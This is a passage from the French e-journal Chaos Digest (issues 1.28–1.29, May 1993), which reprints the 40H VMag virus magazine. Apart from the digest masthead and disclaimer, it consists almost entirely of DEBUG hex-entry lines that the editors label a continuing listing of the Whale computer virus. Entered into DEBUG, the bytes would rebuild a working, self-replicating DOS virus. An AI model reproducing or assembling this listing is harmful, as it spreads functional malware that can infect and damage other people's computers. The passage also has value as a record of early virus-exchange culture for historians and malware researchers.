e 0210  5D 7A 67 A1 19 CD ED C2 4F 98 C3 2C 3E B6 4E 04
e 0220  D8 FE E4 6A D5 F7 C2 15 C6 AD F7 2A 21 D5 8C C2
e 0230  85 E2 6F ED F5 C2 5F CE A8 F7 28 B6 D3 28 29 D1
e 0240  28 A0 F3 FB CE 9A 1E CE EA 08 14 69 29 5A D9 73
e 0250  B4 0F 79 72 E5 7C D9 4C 54 D5 77 F9 79 47 BC 5A
e 0260  19 5F B6 47 F6 52 1A 5F 72 AE 7C 2D 4C 09 7E 81
e 0270  2F 7D 6E 21 72 AF 7C DB 4C 7A B4 65 5A 6F D0 E9
e 0280  01 09 EA A7 FD 73 27 FA 8B 23 9A F3 CE FB B3 2E
e 0290  3D C4 52 F8 2C C0 D4 48 21 F9 FD FC 90 E0 91 CB
e 02A0  2C 69 C9 EA 6C C9 EB C6 F9 3B D4 FA E0 B8 67 D7
e 02B0  0A 6E C6 D1 0C 4A 39 11 C2 97 D3 C6 0A 1D DB CD
e 02C0  D0 E8 59 1B 39 5E 83 3E 5C 45 F4 50 25 5C B6 55
e 02D0  7A 50 74 66 59 83 17 A1 AD 7E D2 4E 78 B6 CD 7F
e 02E0  FF 2E 5C D0 AB 5E 9B 7D 72 5E E5 A0 5B 7B 78 70
e 02F0  6A 7E 44 6B 56 DE 55 58 5E 6B 83 B6 E0 67 64 66
e 0300  2D CE 2C 08 01 E3 DE 77 E7 F0 75 E3 F1 F8 42 F6
e 0310  D6 40 F2 D7 CD 51 DE E3 53 D2 E2 DE 29 D5 B5 F2
e 0320  D0 30 28 27 A0 F8 42 13 F2 0B AD C9 CB CB CE 01
e 0330  08 31 25 18 11 23 24 10 0B 97 F3 01 18 9B 03 22
e 0340  10 0B B8 06 37 36 F8 65 29 08 3D FF 08 0B 00 76
e 0350  AB 00 26 9D D8 7E 98 1E E1 15 89 38 1F 00 AA 1D
e 0360  0E 26 FB 55 15 C8 89 C3 9D DB A7 75 06 D9 ED A3
e 0370  22 13 8C 28 1D 00 AF 25 0C 26 FB 5B 24 FA F2 28
e 0380  AD BB 8D F8 EF 89 A8 EF 8D B8 BF 99 FC AB CD B8
e 0390  AB 99 F8 EF CD B8 AB DD B8 EB 99 A8 BF 8D F8 2E
e 03A0  A6 1C AB C4 EA E8 F6 0D 51 A0 99 62 44 F8 A7 C8
e 03B0  B9 D9 54 71 95 A7 28 E3 AD EC 60 47 B0 E1 96 71
e 03C0  95 B7 21 DA DF 71 32 CD 99 8A CE 6F CB 92 10 8B
e 03D0  FE FA E8 26 13 5B A5 F8 72 75 9C 06 22 13 0E A9
e 03E0  15 06 26 1D 58 2B 55 F3 76 8E D7 AC EB 01 ED FA
e 03F0  BF 3A 98 07 AD 0B 33 E6 9D D8 CD FB 45 21 30 B8
e 0400  CD 20 64 A8 20 E7 98 85 31 80 18 9C C5 FE 31 7B
e 0410  43 8B 98 43 CD 9F 43 4E 9E 43 03 9E 43 A5 9F 43
e 0420  DF 80 8F E8 3B 14 5A CB 16 FC CA D0 2A CD 66 C8
e 0430  B0 FD 56 FE FD 54 C4 FE C3 F3 D9 99 FE 7D 2E C8
e 0440  1C 1B 22 C8 ED C4 67 EB DA 0A E9 D9 0A E9 DF 1E
e 0450  EB EA 34 EB E8 31 E5 EC 36 EB F6 68 E4 F5 1A E4
e 0460  F4 A0 F3 89 5C F0 80 B3 E7 85 8E F2 84 8E F2 9C
e 0470  F1 F0 88 D0 12 FC D0 62 CD 66 C8 23 C2 ED 23 F6
e 0480  F3 90 3D FF 00 8B 25 70 FA 90 3B FA 65 3B 50 41
e 0490  17 1C 39 29 64 E8 8D 15 1B 7A A7 B2 7A A7 33 7A
e 04A0  A7 68 7A C6 B9 54 B0 6A C9 6B D3 3C 49 01 92 9A
e 04B0  59 92 9A 41 66 DC D7 1A EC 75 CE 95 06 34 6D 50
e 04C0  D7 6B 94 7C 6A 61 07 33 24 01 36 26 C5 85 C7 45
e 04D0  7E 2E D9 35 EA 02 E5 E8 4F 15 28 44 5F EB 62 26
e 04E0  47 6A FD 74 1D 54 6C 53 5F E9 62 2A 47 6A 99 AB
e 04F0  BB 5F EC 52 28 47 6A F8 44 1F 54 4C CF 57 35 61
e 0500  99 E4 59 58 C3 98 BC 34 28 48 53 7C 41 8F 20 FB
e 0510  31 20 0F 26 BE 7E 02 2E F1 18 35 11 28 1F C9 9F
e 0520  05 35 8A 26 B3 23 88 71 D9 47 D7 D0 E8 6F 3B 1D
e 0530  D0 33 E7 50 26 2F 14 E2 DE 98 D9 CE FB 04 20 01
e 0540  45 4D D9 43 89 72 D9 33 05 14 31 00 12 7D 50 AD
e 0550  54 4B 56 08 EC 26 CC 37 E8 CE 16 0E B2 37 95 BC
e 0560  98 2E 74 A6 7C B7 87 7C AD 9A 9B E5 FB D4 23 0A
e 0570  58 78 18 6B A5 C5 9B F4 93 89 9D 9A BB 58 C2 4F
e 0580  58 C7 07 7C 10 5F 96 4B 45 64 D0 E8 93 16 28 97
e 0590  8C 38 B1 F5 94 B9 2E A7 CE 87 BF 80 8C 3A B1 F9
e 05A0  94 B9 4A 26 68 8C 3F 81 FB 94 B9 2B 97 CC 87 9F
e 05B0  1C 84 E6 B2 4A 63 8B 8B C3 CE 94 05 3F 73 7E 10
e 05C0  40 96 C8 AD 52 A2 F8 90 97 95 B1 A0 F8 7C C8 37
e 05D0  62 18 6C 88 F5 6F 7A E5 4B 83 60 1B 07 A1 4D 08
e 05E0  AF C9 87 78 11 81 C8 6B 04 AF E0 81 E5 FC 04 7B
e 05F0  3D FF 92 62 09 7E 26 0C 24 3D 88 21 16 0C 24 DF
e 0600  E9 7B 13 EB CE 2F 05 28 27 DC BC D9 1A ED 31 52
e 0610  37 2D F4 FA 54 28 1D 67 03 CF 6A FE CE 37 05 06
e 0620  34 CF 19 CB CF 05 31 97 01 B4 18 FE 41 21 8B 73
e 0630  21 82 F7 20 2F 14 21 F1 10 D1 46 2C A7 E9 7D 3B
e 0640  20 66 03 CF 4E 01 A6 7C 18 A6 92 7F 3B 13 24 55
e 0650  10 E9 69 12 81 49 0E 00 02 90 5F 39 13 E9 65 12
e 0660  E2 22 FA EC 22 F8 43 CF 2B 02 CE C5 04 2D 4B B0
e 0670  B4 B5 BC 3E 77 18 96 5B 44 72 61 03 CF 33 01 CE
e 0680  D2 04 06 67 C0 50 D7 75 5C 3C F4 BD 77 FA 91 DC
e 0690  74 52 D2 74 E3 66 C2 52 D5 F4 CE 49 8B 4C 4A 50
e 06A0  BA 81 6F 73 60 03 CF E5 00 CE 84 04 D7 00 1D 2A
e 06B0  B4 48 8C 02 13 8F CB 16 1B FF 05 53 25 60 36 E9
e 06C0  CA 35 06 0C BE D8 A7 75 B9 13 37 BA 13 35 2E EC
e 06D0  23 66 36 47 03 FA 98 00 FA F5 00 50 0F 5C 55 7C
e 06E0  53 5B 18 23 2A 1B 54 51 79 00 55 7C 53 5B 15 56
e 06F0  5A 67 55 40 15 23 2A 15 20 52 15 57 7B 54 6C 76
e 0700  15 69 60 15 6E 7C 15 46 7A 46 68 32 15 4D 7A 5B
e 0710  64 33 5D 65 61 15 4D 66 41 61 7D 41 20 55 5C 73
e 0720  7B 15 61 7D 51 20 67 5D 65 33 5D 69 77 51 65 7D
e 0730  15 46 7A 46 68 33 70 67 74 46 20 75 5A 72 33 41
e 0740  68 76 4C 20 72 47 65 33 51 61 7E 54 67 7A 5B 67
e 0750  3D 15 54 7B 50 20 60 5C 78 67 5D 20 55 5C 73 7B
e 0760  15 6D 66 41 61 67 50 73 33 5A 6E 7F 4C 20 7A 53
e 0770  20 44 5D 61 7F 50 20 7A 46 20 7A 5B 20 7B 50 72
e 0780  33 76 61 65 50 0E 0C 81 40 AA AE 00 A9 EF 05 EC
e 0790  23 66 36 47 06 A7 0B FF 05 53 25 FB DE 1A E1 CE
e 07A0  0B FD E5 FB 14 DB FA EC DA FB 97 25 02 0C C2 16
e 07B0  F1 04 E0 1A 4C 3A E4 A9 E2 06 EA F7 C7 30 0D 75
e 07C0  C4 9A D3 D0 54 17 A6 67 DA A6 7C 17 A6 92 6F 36
e 07D0  13 24 A6 4C 12 26 F8 CB C5 3D E8 40 10 0C D2 6E
e 07E0  27 59 90 D5 D9 90 D7 3A 78 EE DF 66 1B CD 07 E8
e 07F0  CE 43 03 2A CA 50 2C 41 9E F3 C0 9E DF 22 50 E5
e 0800  C7 75 23 FB 74 2C 60 4D CF 93 FC CF 50 03 AF 45
e 0810  02 AF 5D 04 CD F7 21 2A 11 E6 07 20 DB 75 AE 20
e 0820  26 0C 89 CF FB 00 26 48 53 7C 1D 58 23 03 00 27
e 0830  D0 33 F5 92 EE AE E8 E8 BE E8 E9 E0 16 EB CF B1
e 0840  06 A1 C0 89 38 17 00 2D DA 74 E6 5A E9 75 13 B9
e 0850  3A 13 53 71 FB E8 CD 11 1E 50 8D 2B AC 8D AA AC
e 0860  4B 89 46 03 53 D9 2B 8E D9 23 8A 4E 37 9E EB 67
e 0870  F5 2F 71 77 B8 77 6C 4F 67 7C CE D5 02 3E A5 3D
e 0880  97 A6 F1 92 F6 3D CF A1 37 63 ED E5 11 56 FF D6
e 0890  A4 6E CB 4D 45 89 BC 74 7B 90 C4 22 FA 04 D9 01
e 08A0  EB B7 9A 16 22 13 8B 38 1F 00 C2 12 0B EF 67 10
e 08B0  1E CA 72 2A 94 DA AF 05 04 26 22 C2 C4 F1 74 2D
e 08C0  92 C6 5E 17 E8 2D E8 E9 8E 1A EA CF 90 02 08 D5
e 08D0  84 6F 19 E8 2D DA 74 D5 9A 1E 2A 13 33 F5 9A 16
e 08E0  22 13 31 F6 B0 0C 26 FA 16 DB 92 C6 B6 27 B9 3A
e 08F0  13 F3 82 20 C9 CE FB 4A 24 5A F8 84 F4 71 08 E5
e 0900  FF 67 CE F8 61 5E DC 2D 4F 47 6B CF F6 C1 60 AD
e 0910  CC 60 BD CE EE F7 FA 68 2A DE CE 08 21 62 AD CC
e 0920  62 BD CE C6 04 FD 68 22 DE 62 AD FD 62 BD FF 52
e 0930  E4 DE 2C BD D0 EA F8 6A CC 71 24 C5 07 C8 8D DD
e 0940  36 AD E1 94 FA 5C D8 28 DE 52 C6 C3 75 90 C6 33
e 0950  A8 7D 33 FB F1 D9 90 C6 24 A8 8B 53 FB E8 D9 90
e 0960  C6 24 A8 81 26 FB DF D9 90 C6 2E A8 08 2C FB D6
e 0970  D9 90 C6 24 A8 2F 16 FB CD D9 90 C6 24 A8 A5 24
e 0980  FB C4 D9 90 C6 78 A8 7D 33 FB BB D9 90 C6 23 A8
e 0990  9F 86 FB B2 D9 90 C6 2C A8 A7 26 FB A9 D9 90 C6
e 09A0  2A A8 2D A1 FB A0 D9 90 C6 24 A8 29 5E FB 97 D9
e 09B0  90 C6 24 A8 29 64 FB 8E D9 90 C6 24 A8 C0 3C FB
e 09C0  85 D9 90 C6 4A A8 14 37 FB 7C D9 90 C6 29 A8 00
e 09D0  26 FB 73 D9 90 C6 2D A8 E3 24 FB 6A D9 48 C3 CE
e 09E0  72 01 0A BA A7 88 05 1C AB 03 8C 8F 33 7F 7C 1E
e 09F0  B7 DD B4 B6 3B B5 13 3A 9E 87 70 AC CF AA 0E B9
e 0A00  A1 45 BF E9 9F 5F 89 76 8D 0F E4 B6 67 C0 B1 A2
e 0A10  67 70 08 D7 1E E3 37 E8 0F 12 27 26 9F C0 A7 F8
e 0A20  00 02 0E 00 26 20 D2 08 98 0E E5 37 49 27 D8 15
e 0A30  26 13 41 D1 E2 89 62 30 92 B5 E4 F1 AF 57 21 CE
e 0A40  54 18 0E FA 5D DB FB FA 26 26 52 9C AF A8 90 60
e 0A50  5E 76 A7 73 C4 43 BA 14 BA DE BC CD 93 4F 80 26
e 0A60  6C 6F DE 72 D5 77 5A C8 4C E6 64 5C 6B A9 52 74
e 0A70  1B D1 B6 50 E2 76 A9 A1 8E A9 6C 8E A9 58 6C 77
e 0A80  C3 E9 FA 06 DC FB E8 9C 13 1A B6 6B 3E 4C 67 B1
e 0A90  92 7E 76 97 AD 55 A0 11 B5 06 81 78 78 79 78 AF
e 0AA0  79 78 53 94 8B E5 FB 80 2E FB 17 2E 61 43 08 93
e 0AB0  3E 84 37 00 52 28 E8 DE 02 83 DD EC 74 15 FB 82
e 0AC0  26 37 84 8C 69 8A 00 B3 8A A5 2E 90 A2 28 D6 86
e 0AD0  A4 44 50 38 AA 03 34 A0 84 1E C1 5C B1 0D FF B1
e 0AE0  0D FC 6B 6C 01 80 A1 08 93 26 95 37 FE CF A0 FC
e 0AF0  CE FA 97 DF FB 4C 26 00 D5 FD C1 3D D8 CE 6C E7
e 0B00  C6 FB 52 65 F1 4C 94 F1 1B B8 C2 E7 E1 AF 53 04
e 0B10  26 1D 4E 26 53 E5 26 E1 56 FE 26 13 E8 05 17 2E
e 0B20  D8 15 A2 02 F8 C1 9D FA 61 DF 2E E8 33 13 0F 7E
e 0B30  FF 77 78 65 A7 68 2D 7D 78 54 5F 96 00 4F 6E D0
e 0B40  E9 34 10 3D F3 05 74 DE 3E EF 34 5D FE E1 FA 99
e 0B50  DB 98 D5 AF F6 BB 75 D0 53 EA AD 01 9D 19 C0 52
e 0B60  10 E9 BE 11 E8 FA EC 4D 74 5F 00 5A CD 54 52 65
e 0B70  7C FD 5F 76 50 6F 97 42 65 76 CD 4F 52 CB B0 76
e 0B80  7A 46 A1 D0 1F 4D CD 11 52 CB 46 77 87 E5 E9 8B
e 0B90  BE BA 52 B8 0F 5A CE 54 92 65 7C FB 47 BA 50 6F
e 0BA0  DD 72 F2 76 7A F9 53 3F 46 CE CF B0 76 5A BE 4C
e 0BB0  41 65 BA A0 57 1C 55 31 2E A5 1D B3 02 12 2E D9
e 0BC0  25 B3 02 3D FF 10 FB 24 08 EC 36 C0 37 55 08 D7
e 0BD0  1E 02 37 89 C3 FA BD DE 9A 04 CE 75 FF 02 29 D2
e 0BE0  5B 2E 34 1B 90 2E 1C 96 68 38 07 9B BF 0D C8 B3
e 0BF0  5C 37 3A EE 7F E2 29 3A 32 D7 3C BE 0D D1 F7 C1
e 0C00  BD 0A 0C 2E E3 25 03 03 90 FE 27 66 40 CE 20 FF
e 0C10  11 01 99 22 1B 12 B7 C3 02 80 50 3C CB 17 74 11
e 0C20  02 C1 1A 88 04 31 24 ED 02 19 12 1A 8E 14 37 24
e 0C30  11 2A 13 12 B7 C2 02 1A 88 0C 35 24 ED 02 15 12
e 0C40  1A 8E 14 CB 25 FA 75 17 2A CF 00 01 2F FA D8 26
e 0C50  FB F0 D8 D7 30 FE C7 C8 FF 24 30 38 11 37 55 C1
e 0C60  CA D5 11 F0 AD 02 30 AF 59 30 FE CD CF AD 50 31
e 0C70  AF 29 30 FE C6 CF AD 70 32 AF 3F 30 FE FF CF AD
e 0C80  73 35 AF 29 30 FE F0 CF AD 26 37 AF 63 30 FE E9
e 0C90  CF AD B3 37 AF 75 30 FE E2 CF AD 13 3A AF 07 30
e 0CA0  FE 9B CF AD 29 3C AF 2D 30 FE 8C CF AD E7 3C AF
e 0CB0  1F 30 FE 85 CF AD 79 20 AF 0E 30 FE BE CF AD 25
e 0CC0  21 AF 0A 30 FE B7 CF AD 29 11 AF 44 30 FE A8 CF
e 0CD0  AD 50 11 AF FB 30 FE A1 CF AD 4F 13 AF 1A 30 FE
e 0CE0  5A CF AD 5E 2D AF 06 30 FE 53 CF AD 5F 2C AF 61
e 0CF0  30 FE 44 CF 2A C3 44 0C 0D F7 10 BB 15 E2 D7 8B
e 0D00  8E 06 AC 18 70 03 D6 AD E8 D1 25 36 16 DC CF FE
e 0D10  FE 26 FE 86 C7 FE 52 25 D3 D0 5B A7 D0 78 24 41
e 0D20  83 CB 11 FF C3 FA DB 26 FB 18 D8 0B 90 3D 87 93
e 0D30  F2 81 C3 3D DF 94 37 70 D8 E5 02 63 FF C5 91 6E
e 0D40  D8 78 F3 96 89 52 7B 0E 39 A9 07 03 FB 74 23 FB
e 0D50  5F 29 3D FE 20 FC 24 CE FB 01 08 ED 0E C9 37 E8
e 0D60  C7 EE 46 FC 7D 8B D2 36 CC 9A EC 32 E1 31 32 62
e 0D70  3E 32 9F 3E 54 27 47 19 D2 36 EC 4F ED F4 03 FF
e 0D80  32 D8 E7 25 CA 2F FE 73 CF D0 FC 46 DC F0 C9 C4
e 0D90  4C EB 1F EA C3 DA 14 1A 2D E3 54 82 D2 42 FC 03
e 0DA0  ED F4 72 DF DB D9 21 3A E8 8E 2E D9 3D 03 03 FB
e 0DB0  91 DB 0D 4C E1 03 4D E1 DF 07 B6 D6 48 E1 DF 01
e 0DC0  B6 D6 08 68 D4 CC 25 83 C5 2E 5B A4 68 4E A4 D2
e 0DD0  4B 53 CD 98 2E E0 97 10 34 FA 5D 9F 17 00 AA C8
e 0DE0  09 CD 9D DB F7 F0 E2 DA 9A C8 9F 0F 00 24 34 43
e 0DF0  C4 E8 50 AD 1C 0E 7E C3 EF CF 0E 04 1A 12 74 36
e 0E00  FA 88 D0 12 CB A7 E8 34 0E 61 F8 A7 E2 21 07 B2
e 0E10  E8 16 EE 28 26 3D 83 28 A0 24 27 3D 8C 20 35 24
e 0E20  08 9A 1E 02 37 E8 B4 E5 2E D9 05 66 03 FB 0C D1
e 0E30  3D C4 38 37 24 00 D6 77 34 FB 4D 32 3A 73 25 FA
e 0E40  9E 26 3D 80 00 A0 24 D8 90 FE 27 67 41 CE E0 FC
e 0E50  3E 13 8B 22 10 44 24 40 8B 7A 17 81 D5 5B 53 A7
e 0E60  E0 49 60 12 D8 7D FB 20 32 0A 75 71 FB D4 DA 08
e 0E70  00 AD 4F 01 AD 93 4B FA 9A 04 AD 93 4D FA 9A 44
e 0E80  24 98 80 69 CF 89 62 17 E8 D8 00 1C CD 26 E8 94
e 0E90  EF 30 26 98 16 3C 13 E8 A9 17 2E AD 1D A3 02 90
e 0EA0  C1 36 12 CA 00 9A 57 32 B2 18 26 35 89 61 01 A1
e 0EB0  34 13 03 E7 35 89 61 03 A1 32 13 26 AF 54 0E CE
e 0EC0  D4 13 17 FB 7D DA 0B 00 CE 4D 04 08 9D 1E 85 37
e 0ED0  8B 60 11 A3 2C 13 8B 60 17 A3 2A 13 E8 8C 00 19
e 0EE0  CF D3 F8 08 9F 0E 1C 11 2E AA 05 3C 24 3D 89 00
e 0EF0  2D 02 08 D5 06 1F 11 01 38 4B E8 60 EF 37 B6 6B
e 0F00  AA 40 37 BA 98 7C 86 D0 A6 11 4F 4B 97 C5 88 11
e 0F10  4F 44 97 C3 88 10 48 87 E2 B0 AD 56 B0 59 B4 B7
e 0F20  AD 10 88 59 B4 B6 F7 97 5E 0C 65 EE 6A 93 B6 6B
e 0F30  18 43 6B C4 A5 BB 2E A6 2D DA 02 13 74 25 FA 20
e 0F40  27 D0 E8 D8 E8 27 96 8D 76 90 A2 B0 7F 8D 76 90
e 0F50  A1 B0 2E 8D 76 90 A0 B0 B5 4B 62 87 4B 9D 97 65
e 0F60  B6 B6 A3 B1 17 9D B0 B2 EE EA 7E BF A3 BE 67 0E
e 0F70  A7 2D 00 02 49 4D 52 15 FE 28 33 00 52 68 E8 E4
e 0F80  E8 10 44 D0 66 60 A0 83 B3 90 67 44 73 5B B4 99

------------------------------

End of Chaos Digest #1.28
************************************

Chaos Digest           Mercredi 19 Mai 1993        Volume 1 : Numero 29
                          ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.29 (19 Mai 1993)
File 1--40H VMag Issue 1 Volume 2 #006(2)-007 (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found on some French BBS.  Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Issue 1 Volume 2 #006(2)-007 (reprint)


[suite du listing hexa du virus Whale]

e 0F90  95 56 60 72 47 B2 0A 02 18 06 2A 37 74 7E FB A2
e 0FA0  DD 01 2C 81 29 87 2E 86 2C 08 9E 85 2E C8 DD 01
e 0FB0  ED C4 DF 2D 3F 52 12 40 AF 05 02 02 B0 04 02 90
e 0FC0  3E 32 37 01 53 17 E9 BE 13 E8 CE 3E FF CE 60 FB
e 0FD0  07 50 84 63 44 67 64 50 C8 A3 7B 45 6D 74 E0 73
e 0FE0  74 C0 63 54 67 77 97 45 75 74 BD 9A F3 4D 41 B8
e 0FF0  D4 77 72 E8 2F 12 E9 4E 13 81 D8 13 0F 55 71 E8
e 1000  67 E8 22 D2 46 F4 F6 44 F0 D2 E6 36 73 E5 D0 71
e 1010  E1 F4 D3 25 55 D6 C3 57 DA E7 C1 9A B4 C1 9B A1
e 1020  F5 10 0F 90 C0 C4 74 1F B2 F2 02 37 04 53 21 E8
e 1030  EE ED E8 28 E8 27 E3 67 2C 5B C6 C5 6B D8 C5 C7
e 1040  21 23 E6 6F E6 40 D7 E1 42 D6 E1 E0 D0 C7 C7 21
e 1050  1D D6 9F 83 D6 9E 96 40 D2 E1 0B FA D7 CB FB 9E
e 1060  26 FB DF DC 36 E0 72 CD CE 39 E5 86 E3 DD 6B C8
e 1070  01 C4 7E F2 A3 E8 78 F6 32 D7 CE 48 ED 16 E2 DD
e 1080  1F D0 95 C5 2E B5 F1 2E 0C F1 E0 D0 E8 92 E9 6D
e 1090  74 4F EA 74 16 4D 5A BE 44 12 64 DB 7A 68 76 CC
e 10A0  41 10 FD 57 79 50 72 9B 47 93 7C 8B 57 34 51 F5
e 10B0  6D CE 41 76 C5 5D 7C 8B 57 34 51 72 9B CC 41 10
e 10C0  47 93 7C 8B 57 34 51 F0 4E C0 7E E8 70 41 7C 8B
e 10D0  57 34 51 72 9B CC 43 10 FF 90 7C 8B 57 34 51 C8
e 10E0  44 DF 65 F1 DD 65 D9 8C 44 5D 74 C2 80 74 64 A2
e 10F0  8B 68 95 CD 51 52 83 B0 D9 84 A9 DE 65 2F C3 CE
e 1100  52 FA 40 97 B7 6B 2F 84 E0 1C 55 8C 68 92 C4 B2
e 1110  35 BE 23 C4 18 97 A0 8C 68 92 C4 B2 3C B2 97 73
e 1120  44 1C 4E 29 47 3C A2 D5 AA 5D 81 E2 87 2E 84 86
e 1130  A4 56 A3 6E 30 E2 7F 8C A0 7F 15 A2 7F AF 57 51
e 1140  82 2E B2 85 64 91 B7 86 96 D7 A4 99 83 2B A1 FD
e 1150  87 29 8E 83 51 82 EB 9D 48 64 91 94 B0 51 42 A4
e 1160  78 80 6E 7F B0 A3 7F A4 B3 F0 E8 F9 E4 BE 11 1B
e 1170  81 12 06 EF A5 D5 02 A7 27 68 63 D5 06 15 19 3D
e 1180  CE 39 13 E0 15 33 2C FA 81 12 7B 45 A5 FD 02 A7
e 1190  27 15 C9 92 C6 F5 0B E8 94 E4 E8 80 EA 2D E0 5E
e 11A0  F0 99 F0 C1 BB 3D 51 E0 5E C8 C9 F1 7E E1 82 4D
e 11B0  F6 FE E2 16 10 46 95 DE E8 60 DB 50 C5 D5 B3 E3
e 11C0  55 03 60 FB 39 F6 B3 E3 08 6B D6 CE D0 E8 55 EA
e 11D0  43 D4 09 95 27 CF 34 D2 77 D7 D4 CF 72 DA C1 F2
e 11E0  D4 94 D9 30 A1 CE CD 92 D7 FA 1F F4 42 C4 49 DE
e 11F0  E1 4B C2 E1 16 94 CF 7A D3 A2 10 2C 05 B2 FA 43
e 1200  F3 D4 05 B2 FA 43 F0 D4 05 B2 FA 43 F1 D4 09 5B
e 1210  26 09 87 C4 A5 C3 CF 8E F2 52 E8 8C FC 4B 83 E4
e 1220  03 8E FC 98 1F D1 C8 01 ED 66 0B 52 70 72 2C 60
e 1230  0B CF EE F2 CF 50 E9 68 E1 E9 4B 19 E9 82 EF E8
e 1240  27 EA 2D AA 77 79 58 B1 0C A4 09 A9 AA EB 97 99
e 1250  5F 68 EA 11 54 10 9F 88 4E DF 0A 4A 7B CC 23 5E
e 1260  0C 4F 90 38 EA B1 73 BC F9 A9 42 D2 7E 42 86 9C
e 1270  84 D0 B9 3A 13 89 F1 A0 00 CE FB C6 DE 1D A6 68
e 1280  BC 55 09 62 25 47 B8 B8 87 5D 5B 8F BA E9 7A 13
e 1290  2E E0 97 33 2C FA E9 A5 13 EA CE B5 F8 05 25 DE
e 12A0  8A D7 8D E1 06 8F 1E 25 66 A8 25 36 9E E5 6E F5
e 12B0  65 BD E0 03 C9 24 AA 31 53 C7 C2 F8 D9 C7 F8 ED
e 12C0  39 34 D0 E8 5B EB 24 A2 7F 44 50 89 83 1B C7 84
e 12D0  2B 40 37 A2 A4 44 22 EA 85 98 E2 81 28 8A 04 41
e 12E0  88 AA 2A 89 AC 86 65 2A 4A 09 8B 87 FB 54 DE 08
e 12F0  E0 4D B6 1D E3 2C 3F C4 13 6A 83 0F C4 19 F1 24
e 1300  E8 35 E6 E6 F3 E0 FA 2C 08 B8 FC FC 52 1A 2E D8
e 1310  15 20 26 2F E2 53 1F E8 9B E2 F8 E5 20 C0 20 0C
e 1320  C6 A4 E3 E8 97 E2 F9 E5 3E E8 31 EB 12 AC CA 3E
e 1330  FD B7 75 BA FF AF 82 10 94 0F BD D1 44 D3 85 BF
e 1340  D0 E8 D9 E4 3D 70 AD A5 81 6B D6 7E C9 73 70 30
e 1350  7D 94 05 6A F0 37 73 98 7D 5F 94 05 6A 6E 36 AC
e 1360  42 A1 ED 3C 45 A1 93 40 22 62 4B 58 6F 42 DD 80
e 1370  FA F3 53 FC 1A 70 B9 A5 D4 AD A6 78 AD 6D 81 AD
e 1380  51 7F 7B C3 1D 6C 1E EB 54 F1 C6 C6 45 23 D6 24
e 1390  17 5E 0D B9 5E 1F B9 61 A6 0B C8 90 08 D7 C6 A5
e 13A0  BC 9C EE 54 2C 40 F6 D9 59 0D CD 67 03 47 D4 F3
e 13B0  D5 63 13 C5 02 22 2D E8 55 2A C0 3D 4F E1 3E 1D
e 13C0  61 3B B3 1F 55 FA E1 A0 C4 BE 16 C0 FF 3C F6 3C
e 13D0  6C 11 EB 54 F1 76 95 45 23 D6 24 17 59 06 B8 5E
e 13E0  1E B9 61 96 0B CB 90 1D 3D C4 E0 DB 89 BA DB 47
e 13F0  0A 75 E5 FF 6C 11 EB 52 10 61 E1 50 A0 56 00 E3
e 1400  37 31 0B DD 46 0C C5 2E 69 D4 2D 3A 54 28 92 2A
e 1410  46 DC D4 B3 E2 8B 05 E6 CA 2F D0 09 33 08 94 C6
e 1420  61 E2 C0 E4 96 45 23 D4 33 02 20 9D 15 8C 2E 4E
e 1430  D4 96 B8 3D EE E0 59 0D B3 59 1D FF 54 05 81 09
e 1440  2E FE D5 7C E2 D5 47 D7 D3 C2 E3 0F 24 18 54 05
e 1450  6D D5 39 D7 8C 38 29 A1 C1 E6 CA 2E DA 09 D9 FE
e 1460  16 7F E0 C4 46 29 16 05 08 96 C6 61 E2 5C C3 56
e 1470  05 E1 2D 85 02 20 9D 1C 8C 2E 4F D4 94 A2 8F 2E
e 1480  C9 D5 4A 2B 86 4A 3B CA 47 23 B4 1A 08 CA C6 58
e 1490  D7 C6 61 E2 5C C3 45 C7 23 37 31 61 16 4B E0 2A
e 14A0  F1 BB 2B 0D 94 D2 C0 FF 3D FF 3C CA D8 23 6C D7
e 14B0  23 53 2F 23 3D 84 E0 54 F1 D8 D4 45 23 D7 24 17
e 14C0  8E 3E B9 3D 77 E1 3E C5 C3 52 CA 08 FD C6 6C 1E
e 14D0  D8 6E 0E 9D 61 3E 59 C3 3D D8 E0 6D C4 E0 54 F1
e 14E0  D8 D4 C7 23 37 3E 61 16 4B E0 2A F1 BB 2B 0D 94
e 14F0  D2 C0 FF 3C FC 3C CA D8 23 6C D7 23 53 0B 23 19
e 1500  40 2D 54 37 00 41 85 61 D2 38 E0 96 24 18 5E 04
e 1510  BA 5C 15 B9 85 2D CB 3D C7 E0 16 7D 81 09 9F E1
e 1520  1E C8 59 11 D7 FF 2B 0F A3 54 E9 1E D5 85 02 2D
e 1530  90 69 0B 47 26 58 C6 1E D9 98 94 0B C0 18 CA 2F
e 1540  DA 09 9C 50 95 40 00 3D BF E1 3E 0D 60 38 D4 60
